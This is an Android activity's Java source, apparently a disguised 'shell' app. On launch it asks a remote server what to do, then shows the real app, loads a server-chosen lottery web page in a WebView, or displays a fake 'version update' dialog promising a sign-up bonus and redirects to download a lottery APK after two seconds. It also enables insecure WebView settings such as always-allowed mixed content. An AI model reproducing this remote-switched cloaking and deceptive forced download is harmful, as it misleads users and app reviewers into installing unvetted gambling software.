package com.regus.mj;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.net.Uri;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.support.annotation.Nullable;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.SslErrorHandler;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.RelativeLayout;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;

import javax.xml.parsers.DocumentBuilderFactory;

public class MJRegusActivity extends Activity {


//    String aid = "REGUS_AID";
//    String sid = "REGUS_SID";
//    String agency = "REGUS_AGENCY";
//    String activityPath = "REGUS_PATH_ACT";


    String aid = "6";
    String sid = "6";
    String activityPath = "REGUS_PATH_ACT";


    String baseUrl = "http://majia.132996.com:8010/";
    // String downloadApkUrl = "https://www.ttcai.cn/apps/ttc.apk";
    String downloadApkUrl = "http://www.ttcai.cn/apps/ttc_03.apk";
    String dialogTitle = "版本更新";
    String dialogContent = "升级专业版，注册送288元!";
    private String aimPackage = "com.ttc.lottery";


    WebView mWebView;
    RelativeLayout mRelativeLayout;
    ProgressDialog mProgressDialog;
    boolean isWebviewInit;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (Build.VERSION.SDK_INT >= 21) {
            View decorView = getWindow().getDecorView();
            decorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN | View.SYSTEM_UI_FLAG_LAYOUT_STABLE);
            getWindow().setStatusBarColor(Color.BLACK);
        }

        isWebviewInit = false;

        mRelativeLayout = new RelativeLayout(this);
        mRelativeLayout.setPadding(0, getStatusBarHeight(), 0, 0);

        setContentView(mRelativeLayout);


        mWebView = new WebView(MJRegusActivity.this);
        mWebView.setVisibility(View.INVISIBLE);

        RelativeLayout.LayoutParams layoutParam = new RelativeLayout.LayoutParams
                (RelativeLayout.LayoutParams.MATCH_PARENT, RelativeLayout.LayoutParams.MATCH_PARENT);

        mWebView.setLayoutParams(layoutParam);

        mRelativeLayout.addView(mWebView);

        requset();

    }


    private void requset() {
        new Thread(new RequestRunnable(aid, sid)).start();
    }


    public void initWebSetting() {
        WebSettings webSettings = mWebView.getSettings();

        //支持缩放，默认为true。
        webSettings.setSupportZoom(true);
        //调整图片至适合webview的大小
        webSettings.setUseWideViewPort(true);
        // 缩放至屏幕的大小
        webSettings.setLoadWithOverviewMode(true);
        //设置默认编码
        webSettings.setDefaultTextEncodingName("utf-8");
        webSettings.setBuiltInZoomControls(true);
        webSettings.setDisplayZoomControls(false);
        //多窗口
        webSettings.supportMultipleWindows();
        //获取触摸焦点
        mWebView.requestFocusFromTouch();
        //允许访问文件
        webSettings.setAllowFileAccess(true);
        webSettings.setAllowContentAccess(true);
        //开启javascript
        webSettings.setJavaScriptEnabled(true);

        DocumentBuilderFactory.newInstance().setExpandEntityReferences(false);

        //支持通过JS打开新窗口
        webSettings.setJavaScriptCanOpenWindowsAutomatically(true);
        //提高渲染的优先级
        webSettings.setRenderPriority(WebSettings.RenderPriority.HIGH);
        //支持内容重新布局
        webSettings.setLayoutAlgorithm(WebSettings.LayoutAlgorithm.SINGLE_COLUMN);


        webSettings.setDomStorageEnabled(true);        //设置支持DomStorage

        //图片先不加载最后再加载
        if (Build.VERSION.SDK_INT >= 19) {
            webSettings.setLoadsImagesAutomatically(true);
        } else {
            webSettings.setLoadsImagesAutomatically(false);
        }
        webSettings.setAppCacheEnabled(true);          // 启用缓存
        webSettings.setCacheMode(WebSettings.LOAD_DEFAULT);
        //修改硬件加速导致页面渲染闪烁问题
        // mWebview.setLayerType(View.LAYER_TYPE_SOFTWARE, null);
        mWebView.requestFocus();
        mWebView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
        /**
         * MIXED_CONTENT_ALWAYS_ALLOW：允许从任何来源加载内容，即使起源是不安全的；
         * MIXED_CONTENT_NEVER_ALLOW：不允许Https加载Http的内容，即不允许从安全的起源去加载一个不安全的资源；
         * MIXED_CONTENT_COMPATIBILITY_MODE：当涉及到混合式内容时，WebView 会尝试去兼容最新Web浏览器的风格。
         **/
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            mWebView.getSettings().setMixedContentMode(android.webkit.WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        }

        mWebView.setWebViewClient(new CommonWebViewClient());
        mWebView.setWebChromeClient(new CommonWebChromeClient());

    }

    private class CommonWebViewClient extends WebViewClient {

        @Override
        public void onLoadResource(WebView webView, String s) {
            super.onLoadResource(webView, s);
            Log.e("onPageLoadResource", s);
        }


        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
            //showProgress();
            Log.e("onPageStarted", url);
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            Log.e("onPageFinished", url);
            mWebView.setVisibility(View.VISIBLE);
            hideWebViewLoadDialog();
        }

        @Override
        public void onReceivedError(WebView webView, WebResourceRequest webResourceRequest, WebResourceError webResourceError) {
            super.onReceivedError(webView, webResourceRequest, webResourceError);
        }


        @Override
        public void onReceivedSslError(WebView webView, SslErrorHandler sslErrorHandler, SslError sslError) {
            sslErrorHandler.cancel();
            super.onReceivedSslError(webView, sslErrorHandler, sslError);
        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            Log.e("onPageShoudOver", url);
            if (url == null) return false;

            return shouldfileterUrl(url);
        }

        @Override
        public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
            super.onReceivedError(view, errorCode, description, failingUrl);
            switch (errorCode) {
                case ERROR_CONNECT:

                    break;
            }
        }


        /**
         * 拦截WebView网络请求（Android API < 21）
         * 只能拦截网络请求的URL，请求方法、请求内容等无法拦截
         */
        public WebResourceResponse shouldInterceptRequest(WebView view, String url) {
            return super.shouldInterceptRequest(view, url);
        }

        /**
         * 拦截WebView网络请求（Android API >= 21）
         * 通过解析WebResourceRequest对象获取网络请求相关信息
         */
        public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
            //    Log.e("WebResourceRequest  ", "Cookie: " + CookieManager.getInstance().getCookie(DataCenter.getInstance().getDomain()) + " \n Method: " + request.getMethod() + "  \n Headers: " + request.getRequestHeaders().toString() + "\n");
            return super.shouldInterceptRequest(view, request);
        }
    }


    private class CommonWebChromeClient extends WebChromeClient {
        @Override
        public void onProgressChanged(WebView view, int newProgress) {
            super.onProgressChanged(view, newProgress);
            Log.e("regus WebView progress", newProgress + "");
            showLoadDialogProgress(newProgress);
        }
    }

    boolean shouldfileterUrl(String url) {
        if (url == null) return false;
        try {
            mWebView.loadUrl(url);
        } catch (Exception e) {

        }
        return true;
    }


    /**
     * 利用反射获取状态栏高度
     *
     * @return
     */
    public int getStatusBarHeight() {
        int result = 0;
        //获取状态栏高度的资源id
        int resourceId = getResources().getIdentifier("status_bar_height", "dimen", "android");
        if (resourceId > 0) {
            result = getResources().getDimensionPixelSize(resourceId);
        }
        return result;
    }

    private class RequestRunnable implements Runnable {

        String aid;
        String sid;

        public RequestRunnable(String aid, String sid) {
            this.aid = aid;
            this.sid = sid;
        }

        @Override
        public void run() {

            if (TextUtils.isEmpty(aid) || TextUtils.isEmpty(sid)) {
                jump();
                return;
            }

            String rootUrl = baseUrl + "AppShellService.svc/GetAppInfo?aId=";
            String allUrl = rootUrl + aid + "&sId=" + sid;

            try {
                URL url = new URL(allUrl);
                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setConnectTimeout(5000);
                urlConnection.setReadTimeout(5000);
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                int code = urlConnection.getResponseCode();
                if (code == 200) {
                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();
                    Log.e("regus", jsonStr + "");

                    //处理
                    try {
                        JSONObject responseJson = new JSONObject(jsonStr.replace("\\", ""));
                        if (responseJson.has("Status") && responseJson.has("Data")) {
                            if (responseJson.getBoolean("Status")) {

                                JSONObject dataJsonObject = new JSONObject(responseJson.getString("Data"));

                                if (dataJsonObject.getBoolean("IsDownload")) {
                                    runOnUiThread(new Runnable() {
                                        @Override
                                        public void run() {
                                            showDownLoadDialog();
                                        }
                                    });
                                } else if (dataJsonObject.getBoolean("IsEnable")) {
                                    startWebview(dataJsonObject.getString("Url"));
                                } else {
                                    jump();
                                }

                            } else {
                                jump();
                            }
                            return;
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                        jump();
                    }
                } else {
                    jump();
                }
            } catch (Exception e) {
                jump();
            }

        }


    }


    /**
     * 跳原应用
     */

    private void jump() {
        try {
            Class aimClass = Class.forName(activityPath);
            Intent intent = new Intent(MJRegusActivity.this, aimClass);
            startActivity(intent);
            finish();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }


    /**
     * web 显示h5天天彩
     *
     * @param url
     */
    private void startWebview(final String url) {
        if (TextUtils.isEmpty(url)) {
            jump();
            return;
        }
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                mProgressDialog = new ProgressDialog(MJRegusActivity.this);
                mProgressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
                mProgressDialog.setMax(100);
                mProgressDialog.setMessage("加载中，请稍后...");
                mProgressDialog.show();
                initWebSetting();
                mWebView.loadUrl(url);
            }
        });
    }


    /**
     * 打开下载
     */

    private void showDownLoadDialog() {

        if (isAvilible(aimPackage, this)) {
            jump();
            return;
        }

        //创建dialog构造器
        AlertDialog.Builder normalDialog = new AlertDialog.Builder(this);
        //设置title
        normalDialog.setTitle(dialogTitle);
        //设置内容
        normalDialog.setMessage(dialogContent);
        //设置按钮
        normalDialog.setPositiveButton("确定", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                startBrowsers(downloadApkUrl);
                dialog.dismiss();
                finish();
            }
        });
        normalDialog.show();

        Toast.makeText(this, "版本需要强制更新,自动跳转中", Toast.LENGTH_SHORT);

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                startBrowsers(downloadApkUrl);
            }
        }, 2001);
    }


    /**
     * 调用浏览器
     */

    private void startBrowsers(String url) {
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_VIEW);
        Uri content_url = Uri.parse(url);
        intent.setData(content_url);
        startActivity(intent);
    }




    /**
     * 判断有没有安装该apk
     *
     * @param packageName
     * @param context
     * @return
     */
    public static boolean isAvilible(String packageName, Context context) {
        final PackageManager packageManager = context.getPackageManager();
        // 获取所有已安装程序的包信息
        List<PackageInfo> pinfo = packageManager.getInstalledPackages(0);
        for (int i = 0; i < pinfo.size(); i++) {
            if (pinfo.get(i).packageName.equalsIgnoreCase(packageName))
                return true;
        }
        return false;
    }


    /**
     * 返回上一个页面
     */
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if ((keyCode == KeyEvent.KEYCODE_BACK) && mWebView.canGoBack()) {
            // 返回键退回
            mWebView.goBack();
            return true;
        } else
            return super.onKeyDown(keyCode, event);
    }

    private void showLoadDialogProgress(int progress) {
        if (isWebviewInit) return;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
            if (mProgressDialog != null && !this.isDestroyed()) {
                if (!mProgressDialog.isShowing()) {
                    mProgressDialog.show();
                }
                mProgressDialog.setProgress(progress);
            }
        } else {
            if (mProgressDialog != null) {
                if (!mProgressDialog.isShowing()) {
                    mProgressDialog.show();
                }
                mProgressDialog.setProgress(progress);
            }
        }
    }

    private void hideWebViewLoadDialog() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
            if (mProgressDialog != null && !this.isDestroyed()) {
                if (mProgressDialog.isShowing()) {
                    mProgressDialog.dismiss();
                }
            }
        } else {
            if (mProgressDialog != null) {
                if (mProgressDialog.isShowing()) {
                    mProgressDialog.dismiss();
                }
            }
        }
        isWebviewInit = true;
    }


}
